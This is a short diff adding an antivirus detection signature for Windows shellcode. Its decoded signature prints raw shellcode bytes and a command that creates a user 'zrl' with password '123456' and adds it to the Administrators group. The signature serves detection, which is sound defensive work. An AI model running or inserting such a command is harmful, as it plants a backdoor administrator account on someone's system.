@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Tool.Shellcode_15063-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+כ[1ְP1ְˆC]S»­#†|ÿ׃1ְP»תÊ|ÿ׃טאÿÿÿcmd.exe /c net user zrl 123456 /add && net localgroup Administrators /add zrl && net user zrl
